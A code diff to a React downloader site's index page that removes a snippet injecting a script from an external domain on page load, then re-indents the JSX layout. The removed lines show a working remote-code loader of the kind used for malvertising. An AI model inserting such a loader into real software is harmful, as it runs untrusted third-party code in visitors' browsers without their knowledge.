@@ -10,34 +10,25 @@ const IndexPage = (props) => {
   const intl = useIntl();
   const {pathname} = props.location;
 
-  if (typeof window !== 'undefined') {
-    (function (d, z, s) {
-      s.src = "https://" + d + "/400/" + z;
-      try {
-        (document.body || document.documentElement).appendChild(s);
-      } catch (e) {}
-    })("outsliggooa.com", 5850269, document.createElement("script"));
-  }
-
   return (
-      <Layout>
-        <Seo
-            lang={intl.locale}
-            title={intl.formatMessage({id: "downloader-seo-title"})}
-            pathname={pathname.replace(/^\/?[^\/]+/, "")}
-            endpoint={pathname}
-            description={intl.formatMessage({id: "downloader-seo-desc"})}
-            index="index,follow"
-        />
-        <div className={styles.mainWrapper}>
-          <h1><FormattedMessage id="downloader-title"/></h1>
-          <div>
-            <p><FormattedMessage id="downloader-desc"/></p>
-          </div>
-          <Converter/>
+    <Layout>
+      <Seo
+        lang={intl.locale}
+        title={intl.formatMessage({id: "downloader-seo-title"})}
+        pathname={pathname.replace(/^\/?[^\/]+/, "")}
+        endpoint={pathname}
+        description={intl.formatMessage({id: "downloader-seo-desc"})}
+        index="index,follow"
+      />
+      <div className={styles.mainWrapper}>
+        <h1><FormattedMessage id="downloader-title"/></h1>
+        <div>
+          <p><FormattedMessage id="downloader-desc"/></p>
         </div>
-        <Sections/>
-      </Layout>
+        <Converter/>
+      </div>
+      <Sections/>
+    </Layout>
   )
 };
 
